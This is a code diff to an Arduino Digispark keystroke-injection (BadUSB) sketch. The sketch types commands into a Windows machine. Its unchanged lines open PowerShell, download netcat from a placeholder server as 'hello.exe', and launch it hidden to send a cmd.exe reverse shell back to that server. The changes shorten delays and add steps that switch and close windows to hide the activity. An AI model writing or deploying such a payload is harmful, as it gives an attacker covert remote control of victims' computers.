@@ -24,22 +24,20 @@ void setup() {
   DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
   DigiKeyboardFr.delay(2000);
   DigiKeyboardFr.print("\t");//Press TAB 1
-  DigiKeyboardFr.delay(500);
+  DigiKeyboardFr.delay(250);
   DigiKeyboardFr.print("\t");//Press TAB 2
-  DigiKeyboardFr.delay(500);
+  DigiKeyboardFr.delay(250);
   DigiKeyboardFr.print("\t");//Press TAB 3
-  DigiKeyboardFr.delay(500);
+  DigiKeyboardFr.delay(250);
   DigiKeyboardFr.print("\t");//Press TAB 4
   DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
   DigiKeyboardFr.delay(1500);
   DigiKeyboardFr.sendKeyStroke(KEY_SPACE);
   DigiKeyboardFr.delay(1500);
   DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
-  DigiKeyboardFr.delay(500);
+  DigiKeyboardFr.delay(250);
   DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
   DigiKeyboardFr.delay(2000);
-  DigiKeyboardFr.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); //close window
-  DigiKeyboardFr.sendKeyStroke(0);
   DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboardFr.delay(100);
   DigiKeyboardFr.println("powershell");
@@ -48,10 +46,14 @@ void setup() {
   DigiKeyboardFr.delay(100);
   DigiKeyboardFr.println("wget http://yourserver/nc64.exe =outfile 'hello.exe'"); // I used = instead of - beceause I have a Belgian Keyboard and not a French one
   DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
-  DigiKeyboardFr.delay(100);
+  DigiKeyboardFr.delay(500);
   DigiKeyboardFr.println("powershell =WindowStyle hidden ./hello.exe =nv yourserver PORT =e cmd.exe"); 
-  DigiKeyboardFr.delay(100);
-  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardFr.delay(250);
+  DigiKeyboardFr.sendKeyStroke(43, MOD_ALT_LEFT); //change window
+  DigiKeyboardFr.delay(250);
+  DigiKeyboardFr.sendKeyStroke(KEY_SPACE);
+  DigiKeyboardFr.delay(250);
+  DigiKeyboardFr.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); //close window  
   digitalWrite(1, LOW); // END OF OPERATION
 
 }
